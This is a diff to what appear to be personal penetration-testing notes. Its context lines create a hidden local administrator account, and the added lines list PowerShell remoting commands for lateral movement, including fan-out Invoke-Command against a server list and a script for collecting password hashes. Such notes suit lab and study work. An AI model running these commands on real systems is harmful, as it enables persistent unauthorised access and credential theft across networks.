@@ -75,3 +75,14 @@ All exe's from msfvenom and powerup NO WORK, even bat file to grab NC got caught
 https://bat2exe.net/
 net user shrek shrekt123 /add
 net localgroup administrators shrek /add
+
+## lateral  
+1:1 remoting  
+`new-pssession -computername <computer_name.fqdn>`  
+1:MANY (aka fan-out remoting)
+  * can execute commands AND scripts 
+  * Can be run against multiple machines and even disconnected sessions
+  * Useful for using creds, getting hashes and executing commands
+  * `invoke-command -computername <computername> -scriptblock{whoami;hostname}`
+  * `invoke-command -computername (get-content serverlist.txt) -scriptblock{whoami;hostname}`
+  * `invoke-command -computername (get-content serverlist.txt) -filepath c:\path\to\passhashes.ps1`
